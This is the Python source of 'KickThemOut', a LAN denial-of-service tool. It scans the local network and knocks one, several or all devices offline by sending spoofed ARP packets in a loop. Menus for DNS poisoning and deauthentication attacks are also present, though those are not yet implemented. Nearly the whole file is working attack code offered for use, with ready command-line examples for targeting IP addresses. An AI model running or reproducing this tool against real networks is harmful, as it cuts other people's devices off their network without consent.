#!/usr/bin/env python
# -.- coding: utf-8 -.-
# kickthemout.py
# authors: k4m4 & xdavidhu

"""
Copyright (C) 2016 Nikolaos Kamarinakis (nikolaskam@gmail.com) & David Schütz (xdavid@protonmail.com)
See License at nikolaskama.me (https://nikolaskama.me/kickthemoutproject)
"""

import time, os, sys, logging, math, traceback, optparse
from time import sleep
import urllib2 as urllib
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

notRoot = False
try:
    # check whether user is root
    if os.geteuid() != 0:
        print("\n{0}ERROR: KickThemOut must be run with root privileges. Try again with sudo:\n\t{1}$ sudo python kickthemout.py{2}\n").format(RED, GREEN, END)
        notRoot = True
except:
    # then user is probably on windows
    pass
if notRoot:
    raise SystemExit

def shutdown():
    print('\n\n{0}Thanks for dropping by.'
          '\nCatch ya later!{1}').format(GREEN, END)
    raise SystemExit

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
try:
    from scapy.all import *
    import scan, spoof
except KeyboardInterrupt:
    shutdown()
except:
    print("\n{0}ERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.").format(RED)
    print("\n{0}If you still cannot resolve this error, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n{2}").format(RED, BLUE, END)
    raise SystemExit



# display heading
def heading():
    spaces = " " * 76
    sys.stdout.write(GREEN + spaces + """
    █  █▀ ▄█ ▄█▄    █  █▀    ▄▄▄▄▀  ▄  █ ▄███▄   █▀▄▀█  ████▄   ▄      ▄▄▄▄▀
    █▄█   ██ █▀ ▀▄  █▄█   ▀▀▀ █    █   █ █▀   ▀  █ █ █  █   █    █  ▀▀▀ █
    █▀▄   ██ █   ▀  █▀▄       █    ██▀▀█ ██▄▄    █ ▄ █  █   █ █   █     █
    █  █  ▐█ █▄  ▄▀ █  █     █     █   █ █▄   ▄▀ █   █  ▀████ █   █    █
     █    ▐ ▀███▀    █     ▀         █  ▀███▀      █         █▄ ▄█   ▀
     ▀               ▀               ▀             ▀           ▀▀▀
    """ + END + BLUE +
    '\n' + '{0}Kick Devices Off Your LAN ({1}KickThemOut{2}){3}'.format(YELLOW, RED, YELLOW, BLUE).center(98) +
    '\n' + 'Made With <3 by: {0}Nikolaos Kamarinakis ({1}k4m4{2}) & {0}David Schütz ({1}xdavidhu{2}){3}'.format(
        YELLOW, RED, YELLOW, BLUE).center(111) +
    '\n' + 'Version: {0}0.1{1}\n'.format(YELLOW, END).center(86))



# display options
def optionBanner():
    print('\nChoose option from menu:\n')
    sleep(0.2)
    print('\t{0}[{1}1{2}]{3} Kick ONE Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\t{0}[{1}2{2}]{3} Kick SOME Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\t{0}[{1}3{2}]{3} Kick ALL Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\n\t{0}[{1}E{2}]{3} Exit KickThemOut\n').format(YELLOW, RED, YELLOW, WHITE)



# display options
def attackMethodBanner():
    print('\nSelect attack method:\n')
    sleep(0.2)
    print('\t{0}[{1}1{2}]{3} ARP Spoofing {4}(default){5}').format(YELLOW, RED, YELLOW, WHITE, RED, WHITE)
    sleep(0.2)
    print('\t{0}[{1}2{2}]{3} DNS Poisoning').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\t{0}[{1}3{2}]{3} Deauthing').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\n\t{0}[{1}E{2}]{3} Exit KickThemOut\n').format(YELLOW, RED, YELLOW, WHITE)



# initiate debugging process
def runDebug():
    print("\n\n{0}WARNING! An unknown error has occurred, starting debug...{1}").format(RED, END)
    print(
    "{0}Starting debug... (Please report this crash on 'https://github.com/k4m4/kickthemout/issues' with your private information removed where necessary){1}").format(
        RED, END)
    print("{0}").format(RED)
    try:
        print("Current defaultGatewayMac: " + defaultGatewayMac)
    except:
        print ("Failed to print defaultGatewayMac...")
    try:
        print ("Reloading mac getter function...")
        regenOnlineIPs()
        print("Reloaded defaultGatewayMac: " + defaultGatewayMac)
    except:
        print ("Failed to reload mac getter function / to print defaultGatewayMac...")
    try:
        print ("Known gateway IP: " + defaultGatewayIP)
    except:
        print ("Failed to print defaultGatewayIP...")
    try:
        print ("Crash trace: ")
        print(traceback.format_exc())
    except:
        print ("Failed to print crash trace...")
    print ("DEBUG FINISHED.\nShutting down...")
    print("{0}").format(END)
    raise SystemExit



# regenerate online IPs array & configure gateway
def regenOnlineIPs():
    global onlineIPs
    global defaultGatewayMac
    global defaultGatewayMacSet

    if not defaultGatewayMacSet:
        defaultGatewayMac = ""

    onlineIPs = []
    for host in hostsList:
        onlineIPs.append(host[0])
        if not defaultGatewayMacSet:
            if host[0] == defaultGatewayIP:
                defaultGatewayMac = host[1]

    if not defaultGatewayMacSet and defaultGatewayMac == "":
        # request gateway MAC address (after failed detection by scapy)
        print("\n{0}ERROR: Default Gateway MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(RED, END)
        header = ("{0}kickthemout{1}> {2}Enter your gateway's MAC Address {3}(MM:MM:MM:SS:SS:SS): ".format(BLUE, WHITE, RED, END))
        defaultGatewayMac = raw_input(header)
        defaultGatewayMacSet = True



# scan network
def scanNetwork():
    global hostsList
    try:
        # call scanning function from scan.py
        hostsList = scan.scanNetwork(getDefaultInterface(True))
    except KeyboardInterrupt:
        shutdown()
    except:
        print("\n{0}ERROR: Network scanning failed. Please check your requirements configuration.{1}\n").format(RED, END)
        raise SystemExit
    regenOnlineIPs()



# TODO: Add this to scan.py
# retrieve host MAC address
def retrieveMACAddress(hosts):
    try:
        import nmap

        nm = nmap.PortScanner()
        a = nm.scan(hosts=hosts, arguments='-sP -n')

        for k, v in a['scan'].iteritems():
            if str(v['status']['state']) == 'up':
                    return str(v['addresses']['mac'])
    except:
        return False



# non interactive attack vector
def nonInteractiveAttack():

    print("\n{0}nonInteractiveAttack{1} activated...{2}").format(RED, GREEN, END)

    target = options.targets

    if options.attack is None:
        attackVector = 'ARP'
    else:
        attackVector = (options.attack).upper()

    print("\n{0}Targets: {1}" + ", ".join(target)).format(GREEN, END)

    print("\n{0}Spoofing started... {1}").format(GREEN, END)

    defaultGatewayIP = getGatewayIP()
    defaultGatewayMac = retrieveMACAddress(defaultGatewayIP)

    if attackVector == 'ARP':
        try:
            while True:
                # broadcast malicious ARP packets (10p/s)
                for i in target:
                    ip_address = i
                    mac_address = retrieveMACAddress(ip_address)
                    if mac_address == False:
                        print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
                        raise SystemExit
                    spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, ip_address, mac_address)
                time.sleep(10)
        except KeyboardInterrupt:
            # re-arp targets on KeyboardInterrupt exception
            print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
            reArp = 1
            while reArp != 10:
                # broadcast ARP packets with legitimate info to restore connection
                for i in target:
                    ip_address = i
                    try:
                        mac_address = retrieveMACAddress(ip_address)
                    except:
                        print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
                        raise SystemExit
                    try:
                        spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, ip_address, mac_address)
                    except KeyboardInterrupt:
                        pass
                    except:
                        runDebug()
                reArp += 1
                time.sleep(0.5)
            print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
    #TODO: Implement attack vectors
    else:

        print("\n--> {0}"+attackVector+"{1} attack vector COMING SOON...{2} <--").format(RED, GREEN, END)



# kick one device
def kickoneoff():
    os.system("clear||cls")

    print("\n{0}kickONEOff{1}" + "/{2}" + attackVector  + "{3} selected...{4}\n").format(RED, GREEN, BLUE, GREEN, END)

    sys.stdout.write("{0}Hang on...{1}\r".format(GREEN, END))
    sys.stdout.flush()
    scanNetwork()

    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print("  [{0}" + str(i) + "{1}] {2}" + str(onlineIPs[i]) + "{3}\t"+ vendor + "{4}").format(YELLOW, WHITE, RED, GREEN, END)

    canBreak = False
    while not canBreak:
        try:
            choice = int(raw_input("\nChoose a target: "))
            one_target_ip = onlineIPs[choice]
            canBreak = True
        except KeyboardInterrupt:
            shutdown()
        except:
            print("\n{0}ERROR: Please enter a number from the list!{1}").format(RED, END)

    # locate MAC of specified device
    one_target_mac = ""
    for host in hostsList:
        if host[0] == one_target_ip:
            one_target_mac = host[1]
    if one_target_mac == "":
        print("\nIP address is not up. Please try again.")
        return

    print("\n{0}Target: {1}" + one_target_ip).format(GREEN, END)

    if attackVector == 'ARP':

        print("\n{0}Spoofing started... {1}").format(GREEN, END)
        try:
            while True:
                # broadcast malicious ARP packets (10p/s)
                spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, one_target_ip, one_target_mac)
                time.sleep(10)
        except KeyboardInterrupt:
            # re-arp target on KeyboardInterrupt exception
            print("\n{0}Re-arping{1} target...{2}").format(RED, GREEN, END)
            reArp = 1
            while reArp != 10:
                try:
                    # broadcast ARP packets with legitimate info to restore connection
                    spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                except KeyboardInterrupt:
                    pass
                except:
                    runDebug()
                reArp += 1
                time.sleep(0.5)
            print("{0}Re-arped{1} target successfully.{2}").format(RED, GREEN, END)
    #TODO: Implement attack vectors
    else:

        print("\n--> {0}"+attackVector+"{1} attack vector COMING SOON...{2} <--").format(RED, GREEN, END)



# kick multiple devices
def kicksomeoff():
    os.system("clear||cls")

    print("\n{0}kickSOMEOff{1}" + "/{2}" + attackVector  + "{3} selected...{4}\n").format(RED, GREEN, BLUE, GREEN, END)
    sys.stdout.write("{0}Hang on...{1}\r".format(GREEN, END))
    sys.stdout.flush()
    scanNetwork()

    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print("  [{0}" + str(i) + "{1}] {2}" + str(onlineIPs[i]) + "{3}\t" + vendor + "{4}").format(YELLOW, WHITE, RED, GREEN, END)

    canBreak = False
    while not canBreak:
        try:
            choice = raw_input("\nChoose devices to target(comma-separated): ")
            if ',' in choice:
                some_targets = choice.split(",")
                canBreak = True
            else:
                print("\n{0}ERROR: Please select more than 1 devices from the list.{1}\n").format(RED, END)
        except KeyboardInterrupt:
            shutdown()

    some_ipList = ""
    for i in some_targets:
        try:
            some_ipList += GREEN + "'" + RED + onlineIPs[int(i)] + GREEN + "', "
        except KeyboardInterrupt:
            shutdown()
        except:
            print("\n{0}ERROR: '{1}" + i + "{2}' is not in the list.{3}\n").format(RED, GREEN, RED, END)
            return
    some_ipList = some_ipList[:-2] + END

    print("\n{0}Targets: {1}" + some_ipList).format(GREEN, END)

    if attackVector == 'ARP':

        print("\n{0}Spoofing started... {1}").format(GREEN, END)
        try:
            while True:
                # broadcast malicious ARP packets (10p/s)
                for i in some_targets:
                    ip = onlineIPs[int(i)]
                    for host in hostsList:
                        if host[0] == ip:
                            spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
                time.sleep(10)
        except KeyboardInterrupt:
            # re-arp targets on KeyboardInterrupt exception
            print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
            reArp = 1
            while reArp != 10:
                # broadcast ARP packets with legitimate info to restore connection
                for i in some_targets:
                    ip = onlineIPs[int(i)]
                    for host in hostsList:
                        if host[0] == ip:
                            try:
                                spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                            except KeyboardInterrupt:
                                pass
                            except:
                                runDebug()
                reArp += 1
                time.sleep(0.5)
            print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
    #TODO: Implement attack vectors
    else:

        print("\n--> {0}"+attackVector+"{1} attack vector COMING SOON...{2} <--").format(RED, GREEN, END)



# kick all devices
def kickalloff():
    os.system("clear||cls")

    print("\n{0}kickALLOff{1}" + "/{2}" + attackVector  + "{3} selected...{4}\n").format(RED, GREEN, BLUE, GREEN, END)
    sys.stdout.write("{0}Hang on...{1}\r".format(GREEN, END))
    sys.stdout.flush()
    scanNetwork()

    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print(str("  {0}"+ str(onlineIPs[i]) + "{1}\t" + vendor + "{2}").format(RED, GREEN, END))

    if attackVector == 'ARP':

        print("\n{0}Spoofing started... {1}").format(GREEN, END)
        try:
            # broadcast malicious ARP packets (10p/s)
            reScan = 0
            while True:
                for host in hostsList:
                    if host[0] != defaultGatewayIP:
                        # dodge gateway (avoid crashing network itself)
                        spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
                reScan += 1
                if reScan == 4:
                    reScan = 0
                    scanNetwork()
                time.sleep(10)
        except KeyboardInterrupt:
            print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
            reArp = 1
            while reArp != 10:
                # broadcast ARP packets with legitimate info to restore connection
                for host in hostsList:
                    if host[0] != defaultGatewayIP:
                        try:
                            # dodge gateway
                            spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                        except KeyboardInterrupt:
                            pass
                        except:
                            runDebug()
                reArp += 1
                time.sleep(0.5)
            print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
    #TODO: Implement attack vectors
    else:

        print("{0}"+attackVector+"{1} attack vector COMING SOON...{2}").format(RED, GREEN, END)



# retrieve network interface
def getDefaultInterface(returnNet=False):
    def long2net(arg):
        if (arg <= 0 or arg >= 0xFFFFFFFF):
            raise ValueError("illegal netmask value", hex(arg))
        return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))
    def to_CIDR_notation(bytes_network, bytes_netmask):
        network = scapy.utils.ltoa(bytes_network)
        netmask = long2net(bytes_netmask)
        net = "%s/%s" % (network, netmask)
        if netmask < 16:
            return None
        return net

    iface_routes = [route for route in scapy.config.conf.route.routes if route[3] == scapy.config.conf.iface and route[1] != 0xFFFFFFFF]
    network, netmask, _, interface, address = max(iface_routes, key=lambda item:item[1])
    net = to_CIDR_notation(network, netmask)
    if net:
        if returnNet:
            return net
        else:
            return interface



# retrieve gateway IP
def getGatewayIP():
    try:
        getGateway_p = sr1(IP(dst="google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False)
        return getGateway_p.src
    except:
        # request gateway IP address (after failed detection by scapy)
        print("\n{0}ERROR: Gateway IP could not be obtained. Please enter IP manually.{1}\n").format(RED, END)
        header = ('{0}kickthemout{1}> {2}Enter Gateway IP {3}(e.g. 192.168.1.1): '.format(BLUE, WHITE, RED, END))
        gatewayIP = raw_input(header)
        return gatewayIP



# retrieve default interface MAC address
def getDefaultInterfaceMAC():
    try:
        defaultInterfaceMac = get_if_hwaddr(defaultInterface)
        if defaultInterfaceMac == "" or not defaultInterfaceMac:
            print(
            "\n{0}ERROR: Default Interface MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(
                RED, END)
            header = ('{0}kickthemout{1}> {2}Enter MAC Address {3}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
            defaultInterfaceMac = raw_input(header)
            return defaultInterfaceMac
        else:
            return defaultInterfaceMac
    except:
        # request interface MAC address (after failed detection by scapy)
        print("\n{0}ERROR: Default Interface MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(RED, END)
        header = ('{0}kickthemout{1}> {2}Enter MAC Address {3}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
        defaultInterfaceMac = raw_input(header)
        return defaultInterfaceMac



# resolve mac address of each vendor
def resolveMac(mac):
    try:
        # send request to macvendors.co
        url = "http://macvendors.co/api/vendorname/"
        request = urllib.Request(url + mac, headers={'User-Agent': "API Browser"})
        response = urllib.urlopen(request)
        vendor = response.read()
        vendor = vendor.decode("utf-8")
        vendor = vendor[:25]
        return vendor
    except KeyboardInterrupt:
        shutdown()
    except:
        return "N/A"



# script's main function
def main():

    # display heading
    heading()

    if interactive:

        print(
            "\n{0}Using interface '{1}" + defaultInterface + "{2}' with mac address '{3}" + defaultInterfaceMac + "{4}'.\nGateway IP: '{5}"
            + defaultGatewayIP + "{6}' --> {7}" + str(len(hostsList)) + "{8} hosts are up.{9}").format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END)
        # display warning in case of no active hosts
        if len(hostsList) == 0 or len(hostsList) == 1:
            if len(hostsList) == 1:
                if hostsList[0][0] == defaultGatewayIP:
                    print("\n{0}{1}WARNING: There are {2}0{3} hosts up on you network except your gateway.\n\tYou can't kick anyone off {4}:/{5}\n").format(
                        GREEN, RED, GREEN, RED, GREEN, END)
                    raise SystemExit
            else:
                print(
                "\n{0}{1}WARNING: There are {2}0{3} hosts up on you network.\n\tIt looks like something went wrong {4}:/{5}").format(
                    GREEN, RED, GREEN, RED, GREEN, END)
                print(
                "\n{0}If you are experiencing this error multiple times, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n{2}").format(
                    RED, BLUE, END)
                raise SystemExit

    else:

        print("\n{0}Using interface '{1}" + defaultInterface + "{2}' with mac address '{3}" + defaultInterfaceMac + "{4}'.\nGateway IP: '{5}" +
            defaultGatewayIP + "{6}' --> Target(s): '{7}" + ", ".join(options.targets) + "{8}'.{9}").format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END)

    if options.targets is None:

        try:

            while True:

                optionBanner()

                header = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
                choice = raw_input(header)

                global attackVector

                if choice.upper() == 'E' or choice.upper() == 'EXIT':
                    print('\n{0}Thanks for dropping by.'
                          '\nCatch ya later!{1}').format(GREEN, END)
                    raise SystemExit

                elif choice == '1':
                    if interactive and options.attack is None:
                        attackMethodBanner()
                        header2 = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
                        choice = raw_input(header)
                        if choice.upper() == 'E' or choice.upper() == 'EXIT':
                            print('\n{0}Thanks for dropping by.'
                                '\nCatch ya later!{1}').format(GREEN, END)
                            raise SystemExit
                        elif choice == '1':
                            attackVector = 'ARP'
                            kickoneoff()
                        elif choice == '2':
                            attackVector = 'DNS'
                            kickoneoff()
                        elif choice == '3':
                            attackVector = 'DEAUTH'
                            kickoneoff()
                        else:
                            print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)
                    elif not interactive and options.attack is None:
                        attackVector = 'ARP' # set arp spoof as default attack method
                        kickoneoff()
                    elif (interactive or not interactive) and options.attack is not None:
                        attackVector = (options.attack).upper() # set arp spoof as default attack method
                        kickoneoff()
                    else:
                        print("\n{0}ERROR: Something went terribly wrong. Please report this issue. {1}\n").format(RED, END)
                        raise SystemExit

                elif choice == '2':
                    if interactive and options.attack is None:
                        attackMethodBanner()
                        header2 = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
                        choice = raw_input(header)
                        if choice.upper() == 'E' or choice.upper() == 'EXIT':
                            print('\n{0}Thanks for dropping by.'
                                '\nCatch ya later!{1}').format(GREEN, END)
                            raise SystemExit
                        elif choice == '1':
                            attackVector = 'ARP'
                            kicksomeoff()
                        elif choice == '2':
                            attackVector = 'DNS'
                            kicksomeoff()
                        elif choice == '3':
                            attackVector = 'DEAUTH'
                            kicksomeoff()
                        else:
                            print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)
                    elif not interactive and options.attack is None:
                        attackVector = 'ARP' # set arp spoof as default attack method
                        kicksomeoff()
                    elif (interactive or not interactive) and options.attack is not None:
                        attackVector = (options.attack).upper() # set arp spoof as default attack method
                        kicksomeoff()
                    else:
                        print("\n{0}ERROR: Something went terribly wrong. Please report this issue. {1}\n").format(RED, END)
                        raise SystemExit

                elif choice == '3':
                    if interactive and options.attack is None:
                        attackMethodBanner()
                        header2 = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
                        choice = raw_input(header)
                        if choice.upper() == 'E' or choice.upper() == 'EXIT':
                            print('\n{0}Thanks for dropping by.'
                                '\nCatch ya later!{1}').format(GREEN, END)
                            raise SystemExit
                        elif choice == '1':
                            attackVector = 'ARP'
                            kickalloff()
                        elif choice == '2':
                            attackVector = 'DNS'
                            kickalloff()
                        elif choice == '3':
                            attackVector = 'DEAUTH'
                            kickalloff()
                        else:
                            print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)
                    elif not interactive and options.attack is None:
                        attackVector = 'ARP' # set arp spoof as default attack method
                        kickalloff()
                    elif (interactive or not interactive) and options.attack is not None:
                        attackVector = (options.attack).upper() # set arp spoof as default attack method
                        kickalloff()
                    else:
                        print("\n{0}ERROR: Something went terribly wrong. Please report this issue. {1}\n").format(RED, END)
                        raise SystemExit

                elif choice.upper() == 'CLEAR':
                    os.system("clear||cls")
                else:
                    print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)

        except KeyboardInterrupt:
            shutdown()

    else:

        nonInteractiveAttack()



if __name__ == '__main__':
    # implement option parser
    optparse.OptionParser.format_epilog = lambda self, formatter: self.epilog

    version = '0.1'
    info = 'KickThemOut ' + version + ' Nikolaos Kamarinakis (nikolaskama.me)'

    examples = ('\nExamples:\n'+
                '  sudo python kickthemout.py --attack arp --target 192.168.1.10 \n'+
                '  sudo python kickthemout.py -a dns -t 192.168.1.5,192.168.1.10 \n'+
                '  sudo python kickthemout.py')

    parser = optparse.OptionParser(epilog=examples,
        usage='sudo python %prog [options]',
        prog='kickthemout.py', version=('KickThemOut ' + version))

    parser.add_option('-a', '--attack', action='store',
        dest='attack', help='attack method')

    def targetList(option, opt, value, parser):
        setattr(parser.values, option.dest, value.split(','))
    parser.add_option('-t', '--target', action='callback',
        callback=targetList, type='string',
        dest='targets', help='specify target IP addresses')

    (options, argv) = parser.parse_args()

    # configure appropriate network info
    try:
        defaultInterface = getDefaultInterface()
        defaultGatewayIP = getGatewayIP()
        defaultInterfaceMac = getDefaultInterfaceMAC()
        global defaultGatewayMacSet
        defaultGatewayMacSet = False
    except KeyboardInterrupt:
        shutdown()

    if options.attack is None and options.targets is None:

        # set to interactive version
        interactive = True
        sys.stdout.write("{0}Scanning your network, hang on...{1}\r".format(GREEN, END))
        sys.stdout.flush()

        # commence scanning process
        scanNetwork()

    elif options.attack is not None and options.targets is None:

        if (options.attack).upper() == 'ARP' or (options.attack).upper() == 'DNS' or (options.attack).upper() == 'DEAUTH':
            
            # set to interactive version
            interactive = True
            sys.stdout.write("{0}Scanning your network, hang on...{1}\r".format(GREEN, END))
            sys.stdout.flush()
    
            # commence scanning process
            scanNetwork()
        
        else:
            
            print("\n{0}ERROR: Invalid attack method selected. Please select one of the following methods:\n" +
                "\t{1}ARP{2} (ARP Spoofing), {3}DNS{4} (DNS Poisoning), {5}DEAUTH{6} (Deauthanticating){7}\n").format(RED, BLUE, RED, BLUE, RED, BLUE, RED, END)
            raise SystemExit

    else:

        if (options.attack).upper() == 'ARP' or (options.attack).upper() == 'DNS' or (options.attack).upper() == 'DEAUTH':
            pass
        else:
            print("\n{0}ERROR: Invalid attack method selected. Please select one of the following methods:\n" +
                "\t{1}ARP{2} (ARP Spoofing), {3}DNS{4} (DNS Poisoning), {5}DEAUTH{6} (Deauthanticating){7}\n").format(RED, BLUE, RED, BLUE, RED, BLUE, RED, END)
            raise SystemExit

        # set to optparser version
        interactive = False

    main()
